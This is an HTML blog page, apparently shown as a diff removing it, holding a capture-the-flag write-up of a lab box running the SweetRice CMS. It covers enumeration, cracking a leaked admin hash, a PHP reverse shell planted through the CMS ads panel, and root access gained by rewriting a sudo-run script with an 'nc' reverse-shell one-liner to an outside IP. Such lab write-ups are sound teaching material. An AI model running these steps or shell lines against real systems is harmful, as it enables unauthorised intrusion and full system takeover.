@@ -1,347 +1,0 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="nair0lf32 ">
-<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/&#43;sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy&#43;ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n&#43;QwL8&#43;QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p&#43;VtuxdH6mu9YztRymXmXPKJfB| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg&#43;XwisNmDmdsHKumQYqiUbxqVd&#43;E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=| 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 11321, Words: 3503, Lines: 376]." />
-<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
-<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/lazy-admin/lazy-admin/" />
-
-
-    <title>
-        
-            Lazy Admin :: Zer0ne blog 
-        
-    </title>
-
-
-
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
-
-
-
-<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
-
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
-    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="Lazy Admin">
-<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/&#43;sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy&#43;ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n&#43;QwL8&#43;QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p&#43;VtuxdH6mu9YztRymXmXPKJfB| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg&#43;XwisNmDmdsHKumQYqiUbxqVd&#43;E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=| 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 11321, Words: 3503, Lines: 376]."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
-<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
-<meta itemprop="wordCount" content="944"><meta itemprop="image" content="http://localhost:1313/" />
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Lazy Admin"/>
-<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/&#43;sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy&#43;ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n&#43;QwL8&#43;QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p&#43;VtuxdH6mu9YztRymXmXPKJfB| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg&#43;XwisNmDmdsHKumQYqiUbxqVd&#43;E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=| 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 11321, Words: 3503, Lines: 376]."/>
-
-
-
-    <meta property="og:title" content="Lazy Admin" />
-<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/&#43;sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy&#43;ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n&#43;QwL8&#43;QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p&#43;VtuxdH6mu9YztRymXmXPKJfB| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg&#43;XwisNmDmdsHKumQYqiUbxqVd&#43;E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=| 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 11321, Words: 3503, Lines: 376]." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/lazy-admin/lazy-admin/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
-<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
-<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />
-
-
-
-
-
-    <meta property="article:section" content="TryHackMe" />
-
-
-
-    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
-
-
-
-
-
-
-
-
-
-
-    </head>
-
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="http://localhost:1313/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">#&gt;</span>
-            <span class="logo__text">0/1</span>
-            <span class="logo__cursor" style=
-                  "
-                   background-color:#0FF00D;
-                   animation-duration:2s;">
-            </span>
-        
-    </div>
-</a>
-
-
-        <span class="header__right">
-            
-                <nav class="menu">
-    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
-    </ul>
-</nav>
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-            
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
-</header>
-
-
-            <div class="content">
-                
-    <main class="post">
-
-        <div class="post-info">
-            
-            </p>
-        </div>
-
-        <article>
-            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/lazy-admin/lazy-admin/">Lazy Admin</a></h2>
-
-            
-            
-            
-
-            <div class="post-content">
-                <!-- raw HTML omitted -->
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="nmap">nmap</h3>
-<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
-22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
-|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
-|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
-80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><h3 id="ffuf">ffuf</h3>
-<pre tabindex="0"><code>                        [Status: 200, Size: 11321, Words: 3503, Lines: 376]
-.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
-.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
-.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
-content                 [Status: 301, Size: 314, Words: 20, Lines: 10]
-index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
-server-status           [Status: 403, Size: 277, Words: 20, Lines: 10
-/content                [Status: 200, Size: 2199, Words: 109, Lines: 36]
-_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10]
-
-.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
-.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
-.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
-as                      [Status: 301, Size: 319, Words: 20, Lines: 10]
-attachment              [Status: 301, Size: 327, Words: 20, Lines: 10]
-images                  [Status: 301, Size: 323, Words: 20, Lines: 10]
-inc                     [Status: 301, Size: 320, Words: 20, Lines: 10]
-index.php               [Status: 200, Size: 2199, Words: 109, Lines: 36]
-js                      [Status: 301, Size: 319, Words: 20, Lines: 10]
-</code></pre><p>There is a <code>&quot;content&quot;</code> directory</p>
-<pre tabindex="0"><code>Welcome to SweetRice - Thank your for install SweetRice as your website management system.
-This site is building now , please come late.
-
-If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting
-
-and uncheck the checkbox &#34;Site close&#34; to open your website.
-
-More help at Tip for Basic CMS SweetRice installed
-
-Powered by Basic-CMS.ORG SweetRice.
-
-//down down bad practices...
-
-These tips may be useful for you install SweetRice.
-
-1,Open your website.
-
-Default,when you installed SweetRice,your website&#39;s status is &#34;close&#34;,and SweetRice will show &#34;Site is building now , please come late.?&#34; to visitors,if you ready to open your website,you can go to Setting -&gt; General , uncheck the checkbox for &#34;Site Close&#34; and submit,your website&#39;s status will be &#34;open&#34;.
-
-When you upgrade website, this feature may be useful.You can input some words to the textarea for &#34;Site Close Tip&#34; to replace the word &#34;Site is building now , please come late.?&#34;.
-
-2,Protect your data.
-
-SweetRice save all important file in the inc directory,there are two kinds of format ?:.txt (link.txt , htaccess.txt, lastest.txt) and .db (if track feature enabled).If you are using apache server,the file .htaccess which in inc directory will work for protect your data,if your server is nginx,you may see Security setting for Nginx.For other web server ,you may try it yourself.
-
-3.Enable URL rewrite
-
-Apache server supports .htaccess,when URL rewrite feature enabled ?,a .htaccess file will be saved to your web root directory.The file content is:
-
-RewriteEngine On
-RewriteBase &#34;your web root&#34;
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . index.php [L]
-
-Nginx server does not supports .htaccess file,you may add the URL rewrite config to the nginx.conf or your nginx config file.
-
-example:
-
-location / {
-root /htdocs;
-index index.html index.php;
-if (!-e $request_filename){
-		 rewrite ^/demo/.+$ /demo/index.php last;
-}
-}
-
-4,Set permalinks
-
-SweetRice supports custom permalink,you can go to Setting-&gt;Permaliks to set permalinks for Attachment,RssFeed,tag etc.
-
-5,Custom SweetRice
-
-SweetRice is very simple,but you can easy to build your custom website,Do not like default theme?you can use the example \_themes/wblog to build a new theme or download theme from SweetRice Themes?;
-
-Need new feature?you can build a plugin and install it,some plugin at SweetRice Plugins? and you can submit your request to us.
-</code></pre><p>Lets visit /content/inc then</p>
-<p>latest version of basic-cms sweetrice is 1.5.1 (no great cve anyway)</p>
-<p>And a backup of sql database is downloadable (lol that&rsquo;s it)</p>
-<p>Just read it</p>
-<pre tabindex="0"><code>14 =&gt; &#39;INSERT INTO `%--%_options` VALUES(\&#39;1\&#39;,\&#39;global_setting\&#39;,\&#39;a:17:{s:4:\\&#34;name\\&#34;;s:25:\\&#34;Lazy Admin&amp;#039;s Website\\&#34;;s:6:\\&#34;author\\&#34;;s:10:\\&#34;Lazy Admin\\&#34;;s:5:\\&#34;title\\&#34;;s:0:\\&#34;\\&#34;;s:8:\\&#34;keywords\\&#34;;s:8:\\&#34;Keywords\\&#34;;s:11:\\&#34;description\\&#34;;s:11:\\&#34;Description\\&#34;;s:5:\\&#34;admin\\&#34;;s:7:\\&#34;manager\\&#34;;s:6:\\&#34;passwd\\&#34;;s:32:\\&#34;42f749ade7f9e195bf475f37a44cafcb\\&#34;;s:5:\\&#34;close\\&#34;;i:1;s:9:\\&#34;close_tip\\&#34;;s:454:\\&#34;&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\&#34;Site close\\&#34; to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\&#34;http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\&#34;&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\&#34;;s:5:\\&#34;cache\\&#34;;i:0;s:13:\\&#34;cache_expired\\&#34;;i:0;s:10:\\&#34;user_track\\&#34;;i:0;s:11:\\&#34;url_rewrite\\&#34;;i:0;s:4:\\&#34;logo\\&#34;;s:0:\\&#34;\\&#34;;s:5:\\&#34;theme\\&#34;;s:0:\\&#34;\\&#34;;s:4:\\&#34;lang\\&#34;;s:9:\\&#34;en-us.php\\&#34;;s:11:\\&#34;admin_email\\&#34;;N;}\&#39;,\&#39;1575023409\&#39;);&#39;,
-</code></pre><p>so basically creds are</p>
-<p><code>Lazy Admin : 42f749ade7f9e195bf475f37a44cafcb</code></p>
-<p>Its a hash and its crackable</p>
-<p>its md5 for <code>Password123</code></p>
-<p>I wonder if can ssh with that? nope we gotta find a login page&hellip;.go fuzz content again</p>
-<p>we get a <code>&quot;as&quot;</code> directory with a login page</p>
-<p>Ok the credentials were actually</p>
-<p><code>manager : Password123</code></p>
-<p>Still doesnt work for ssh&hellip;we have to abuse that website</p>
-<p>in Ads panel we can create custom ads&hellip;its php code that will be executed so I say Reverse shell it is!</p>
-<p>when created you can actiate your shell by clicking on your named ad in <code>/content/inc/ads</code></p>
-<p>As they say in the movies&hellip;we are in!</p>
-<p>the user home folder is named <code>itguy</code></p>
-<pre tabindex="0"><code>www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
-cat mysql_login.txt
-rice:randompass //hohoho..great
-</code></pre><p>FLAG #1
-<code>$ cat user.txt</code>
-THM{lazy_flag_for_lazy_people}</p>
-<p>Time to get real</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<pre tabindex="0"><code>sudo -l
-Matching Defaults entries for www-data on THM-Chal:
-env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on THM-Chal:
-(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
-</code></pre><p>So we can run that perl backup script in user folder&hellip;let&rsquo;s analyse its code</p>
-<pre tabindex="0"><code>cat backup.pl
-#!/usr/bin/perl
-
-system(&#34;sh&#34;, &#34;/etc/copy.sh&#34;);
-</code></pre><p>it runs <code>/etc/copy.sh</code>&hellip;so what is that?</p>
-<pre tabindex="0"><code>cat /etc/copy.sh
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f
-</code></pre><p>its already a reverse shell..we will just adapt it to point to us</p>
-<pre tabindex="0"><code>echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.226.203 4444 &gt;/tmp/f&#39; &gt; /etc/copy.sh
-
-sudo /usr/bin/perl /home/itguy/backup.pl
-</code></pre><p>And we are done</p>
-<pre tabindex="0"><code># id
-
-uid=0(root) gid=0(root) groups=0(root)
-
-# cat root.txt
-
-THM{super_flag_to_get_root_instantly}
-</code></pre><p>Feeling lazy too now&hellip;that one room was enough for today!</p>
-
-            </div>
-        </article>
-
-        <hr />
-
-        <div class="post-info">
-            
-            
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="http://localhost:1313/categories/tryhackme/">TryHackMe</a></span>
-        
-    </p>
-
-			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
-  		</div>
-    </main>
-
-            </div>
-
-            
-                <footer class="footer">
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>&copy; 2024</span>
-            <span><a href="http://localhost:1313/">nair0lf32</a></span>
-            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
-            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
-            
-        </div>
-    </div>
-    
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
-        </div>
-    </div>
-    
-</footer>
-
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>
-
-
-
-    </body>
-</html>
